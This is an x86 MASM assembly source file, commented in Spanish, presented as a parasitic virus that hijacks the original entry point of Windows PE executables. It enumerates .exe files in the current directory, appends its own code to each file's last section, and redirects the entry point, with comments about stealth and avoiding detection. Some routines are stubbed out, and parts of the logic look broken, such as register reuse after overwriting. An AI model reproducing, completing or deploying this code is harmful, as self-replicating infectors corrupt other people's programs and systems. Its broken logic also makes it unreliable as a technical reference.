; ============================================================================
; VIRUS PARÁSITO - SECUESTRO DE OEP (CÓDIGO FINAL)
; ============================================================================
; Plataforma: Windows x86 (32-bit)
; Compilación: MASM / FASM
; Descripción: Virus que infecta archivos PE modificando el AddressOfEntryPoint
; ============================================================================

.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

; ============================================================================
; CONSTANTES Y ESTRUCTURAS
; ============================================================================
VIRUS_SIZE          equ 2048                          ; Tamaño del código viral
MARKER              equ 0DEADBEEFh                    ; Marca de infección

; Estructura para guardar el contexto original del programa
OEP_ORIGINAL        dd 0
IMAGE_BASE          dd 0

; ============================================================================
; SECCIÓN DE DATOS
; ============================================================================
.data
    ; Cadenas para búsqueda de archivos
    searchMask      db "*.exe", 0
    currentDir      db ".", 0
    
    ; Mensajes (desactivados en versión final para sigilo)
    ; msgInfecting    db "Infectando archivo...", 0
    ; msgError        db "Error en la infección", 0
    
    ; Variables para búsqueda
    findHandle      dd 0
    win32FindData   WIN32_FIND_DATA <>
    
    ; Buffer para rutas de archivos
    filePath        db 260 dup (0)
    
    ; Variables para manipulación de archivos
    hFile           dd 0
    hMapping        dd 0
    pMapping        dd 0
    fileSize        dd 0
    
    ; Punteros a estructuras PE
    pDosHeader      dd 0
    pNtHeaders      dd 0
    pSectionHeader  dd 0
    lastSection     dd 0
    
    ; Valores guardados
    originalOEP     dd 0
    originalImageBase dd 0
    newEntryPoint   dd 0

; ============================================================================
; SECCIÓN DE CÓDIGO - PUNTO DE ENTRADA VIRAL
; ============================================================================
.code
start:
    ; ------------------------------------------------------------------------
    ; INICIO DEL VIRUS - Se ejecuta antes que el programa huésped
    ; ------------------------------------------------------------------------
    
    ; Guardar todos los registros (estado original del programa)
    pushad
    pushfd
    
    ; Calcular la dirección base de ejecución (delta offset)
    call get_delta
get_delta:
    pop ebp
    sub ebp, offset get_delta
    
    ; ------------------------------------------------------------------------
    ; RUTINA PRINCIPAL DE INFECCIÓN
    ; ------------------------------------------------------------------------
    
    ; Buscar y procesar archivos .exe en el directorio actual
    lea eax, [ebp + searchMask]
    push eax
    call buscar_y_procesar_archivos
    
    ; Nota: En una versión completa, aquí se podría buscar recursivamente
    ; en subdirectorios o en rutas del sistema
    
    ; ------------------------------------------------------------------------
    ; RESTAURAR Y SALTAR AL PROGRAMA HUÉSPED
    ; ------------------------------------------------------------------------
    
    ; Restaurar estado original
    popfd
    popad
    
    ; Saltar al punto de entrada original del programa huésped
    ; Esta dirección se guardó durante la infección inicial
    mov eax, 0DEADBEEFh          ; Placeholder - será reemplazado con OEP real
    jmp eax                      ; JMP al OEP original

; ============================================================================
; FUNCIÓN: buscar_y_procesar_archivos
; ============================================================================
buscar_y_procesar_archivos proc
    push ebp
    mov ebp, esp
    
    ; Inicializar búsqueda de archivos .exe
    lea eax, [ebp + win32FindData]
    push eax
    lea eax, [ebp + searchMask]
    push eax
    call FindFirstFileA
    
    cmp eax, INVALID_HANDLE_VALUE
    je busqueda_finalizada
    
    mov [ebp + findHandle], eax
    
procesar_siguiente_archivo:
    ; Obtener nombre del archivo encontrado
    lea esi, [ebp + win32FindData.cFileName]
    
    ; Evitar infectarse a sí mismo (el archivo actualmente ejecutándose)
    ; [Código de verificación de autoejecución omitido por brevedad]
    
    ; Verificar si el archivo ya está infectado (marca)
    call verificar_marca_infeccion
    cmp eax, 1
    je siguiente_archivo
    
    ; Intentar infectar el archivo
    push esi
    call infectar_archivo
    add esp, 4
    
    ; Limitar número de infecciones por ejecución (evitar detección)
    ; [Contador de infecciones omitido]
    
siguiente_archivo:
    ; Buscar siguiente archivo
    lea eax, [ebp + win32FindData]
    push eax
    push [ebp + findHandle]
    call FindNextFileA
    
    cmp eax, 0
    jne procesar_siguiente_archivo
    
busqueda_finalizada:
    push [ebp + findHandle]
    call FindClose
    
    pop ebp
    ret
buscar_y_procesar_archivos endp

; ============================================================================
; FUNCIÓN: verificar_marca_infeccion
; ============================================================================
verificar_marca_infeccion proc
    ; [Código para leer el archivo y verificar si tiene la marca MARKER]
    ; Retorna 1 si ya está infectado, 0 si no
    xor eax, eax    ; Por ahora asumimos no infectado
    ret
verificar_marca_infeccion endp

; ============================================================================
; FUNCIÓN: infectar_archivo
; ============================================================================
infectar_archivo proc filename:dword
    push ebp
    mov ebp, esp
    
    ; ------------------------------------------------------------------------
    ; PASO 1: ABRIR EL ARCHIVO OBJETIVO
    ; ------------------------------------------------------------------------
    push 0                          ; hTemplateFile
    push FILE_ATTRIBUTE_NORMAL      ; dwFlagsAndAttributes
    push OPEN_EXISTING              ; dwCreationDisposition
    push 0                          ; lpSecurityAttributes
    push FILE_SHARE_READ or FILE_SHARE_WRITE
    push GENERIC_READ or GENERIC_WRITE
    push [ebp + filename]
    call CreateFileA
    
    cmp eax, INVALID_HANDLE_VALUE
    je error_infeccion
    
    mov [ebp + hFile], eax
    
    ; ------------------------------------------------------------------------
    ; PASO 2: OBTENER TAMAÑO DEL ARCHIVO
    ; ------------------------------------------------------------------------
    push 0
    push [ebp + hFile]
    call GetFileSize
    
    mov [ebp + fileSize], eax
    
    ; ------------------------------------------------------------------------
    ; PASO 3: CREAR FILE MAPPING
    ; ------------------------------------------------------------------------
    push 0                          ; lpName
    push 0                          ; dwMaximumSizeLow (usa tamaño actual)
    push 0                          ; dwMaximumSizeHigh
    push PAGE_READWRITE             ; flProtect
    push 0                          ; lpFileMappingAttributes
    push [ebp + hFile]
    call CreateFileMappingA
    
    cmp eax, 0
    je cerrar_archivo_error
    
    mov [ebp + hMapping], eax
    
    ; ------------------------------------------------------------------------
    ; PASO 4: MAPEAR VISTA DEL ARCHIVO
    ; ------------------------------------------------------------------------
    push 0                          ; dwNumberOfBytesToMap (todo el archivo)
    push 0                          ; dwFileOffsetLow
    push 0                          ; dwFileOffsetHigh
    push FILE_MAP_ALL_ACCESS        ; dwDesiredAccess
    push [ebp + hMapping]
    call MapViewOfFile
    
    cmp eax, 0
    je cerrar_mapping_error
    
    mov [ebp + pMapping], eax
    mov esi, eax                    ; ESI = puntero al inicio del archivo
    
    ; ------------------------------------------------------------------------
    ; PASO 5: VERIFICAR FORMATO PE
    ; ------------------------------------------------------------------------
    
    ; Verificar firma DOS "MZ"
    cmp word ptr [esi], IMAGE_DOS_SIGNATURE
    jne desmapear_error
    
    ; Obtener encabezado PE
    mov edi, [esi + 3Ch]            ; e_lfanew
    add edi, esi                    ; EDI = puntero a encabezado PE
    
    ; Verificar firma PE "\0\0"
    cmp dword ptr [edi], IMAGE_NT_SIGNATURE
    jne desmapear_error
    
    mov [ebp + pNtHeaders], edi
    
    ; ------------------------------------------------------------------------
    ; PASO 6: GUARDAR OEP ORIGINAL
    ; ------------------------------------------------------------------------
    mov eax, [edi + 28h]            ; AddressOfEntryPoint
    mov [ebp + originalOEP], eax
    
    ; Guardar ImageBase
    mov eax, [edi + 34h]            ; ImageBase
    mov [ebp + originalImageBase], eax
    
    ; ------------------------------------------------------------------------
    ; PASO 7: LOCALIZAR ÚLTIMA SECCIÓN
    ; ------------------------------------------------------------------------
    movzx ecx, word ptr [edi + 6]   ; NumberOfSections
    dec ecx                         ; Índice de la última sección
    
    ; Calcular puntero a la primera sección
    mov eax, edi
    add eax, 18h                    ; Tamaño del Optional Header
    movzx edx, word ptr [edi + 14h] ; SizeOfOptionalHeader
    add eax, edx                    ; EAX = inicio de tabla de secciones
    
    ; Calcular puntero a la última sección
    mov edx, 28h                    ; Tamaño de IMAGE_SECTION_HEADER
    mul edx                         ; (No usado directamente)
    
    imul edx, ecx, 28h
    add eax, edx
    
    mov [ebp + lastSection], eax    ; EAX = puntero a última sección
    mov ebx, eax
    
    ; ------------------------------------------------------------------------
    ; PASO 8: CALCULAR NUEVO PUNTO DE ENTRADA
    ; ------------------------------------------------------------------------
    
    ; Nueva dirección = VirtualAddress + VirtualSize
    mov eax, [ebx + 0Ch]            ; VirtualAddress
    add eax, [ebx + 8]              ; VirtualSize
    
    ; Alinear a SectionAlignment
    mov ecx, [edi + 38h]            ; SectionAlignment
    add eax, ecx
    dec eax
    xor edx, edx
    div ecx
    mul ecx
    
    mov [ebp + newEntryPoint], eax
    
    ; ------------------------------------------------------------------------
    ; PASO 9: COPIAR CÓDIGO VIRAL AL FINAL DE LA ÚLTIMA SECCIÓN
    ; ------------------------------------------------------------------------
    
    ; Calcular offset RAW donde copiar el virus
    mov eax, [ebx + 14h]            ; PointerToRawData
    add eax, [ebx + 10h]            ; SizeOfRawData
    
    ; Copiar código viral
    push esi                        ; Guardar puntero al archivo
    mov edi, esi
    add edi, eax                    ; EDI = destino en el archivo
    
    lea esi, [ebp + start]          ; ESI = inicio del código viral
    mov ecx, VIRUS_SIZE
    rep movsb                       ; Copiar virus
    
    ; Parchear el salto al OEP original en el código viral copiado
    mov eax, [ebp + originalOEP]
    mov dword ptr [edi - VIRUS_SIZE + (offset patch_oep - offset start)], eax
    
    pop esi
    
    ; ------------------------------------------------------------------------
    ; PASO 10: ACTUALIZAR CARACTERÍSTICAS DE LA SECCIÓN
    ; ------------------------------------------------------------------------
    
    ; Aumentar VirtualSize
    mov eax, [ebx + 8]              ; VirtualSize original
    add eax, VIRUS_SIZE
    mov [ebx + 8], eax
    
    ; Aumentar SizeOfRawData
    mov eax, [ebx + 10h]            ; SizeOfRawData original
    add eax, VIRUS_SIZE
    mov [ebx + 10h], eax
    
    ; Establecer características de la sección (executable, readable)
    or dword ptr [ebx + 24h], IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
    
    ; ------------------------------------------------------------------------
    ; PASO 11: MODIFICAR EL OEP EN EL ENCABEZADO PE
    ; ------------------------------------------------------------------------
    mov eax, [ebp + newEntryPoint]
    mov [edi + 28h], eax            ; AddressOfEntryPoint = nueva dirección
    
    ; ------------------------------------------------------------------------
    ; PASO 12: ACTUALIZAR SizeOfImage
    ; ------------------------------------------------------------------------
    mov eax, [ebx + 0Ch]            ; VirtualAddress
    add eax, [ebx + 8]              ; VirtualSize (actualizado)
    
    ; Alinear a SectionAlignment
    mov ecx, [edi + 38h]            ; SectionAlignment
    add eax, ecx
    dec eax
    xor edx, edx
    div ecx
    mul ecx
    
    mov [edi + 50h], eax            ; SizeOfImage
    
    ; ------------------------------------------------------------------------
    ; PASO 13: MARCAR COMO INFECTADO (opcional - en checksum o sección)
    ; ------------------------------------------------------------------------
    ; [Código para escribir MARKER en un campo no utilizado]
    
    ; ------------------------------------------------------------------------
    ; PASO 14: LIMPIAR Y CERRAR
    ; ------------------------------------------------------------------------
    
desmapear_error:
    push [ebp + pMapping]
    call UnmapViewOfFile
    
cerrar_mapping_error:
    push [ebp + hMapping]
    call CloseHandle
    
cerrar_archivo_error:
    push [ebp + hFile]
    call CloseHandle
    
error_infeccion:
    pop ebp
    ret 4
infectar_archivo endp

; ============================================================================
; MARCADORES DE PARCHADO
; ============================================================================
patch_oep:
    ; Este marcador será reemplazado con el OEP original durante la infección
    mov eax, 0DEADBEEFh
    jmp eax

; ============================================================================
; FIN DEL CÓDIGO VIRAL
; ============================================================================
end start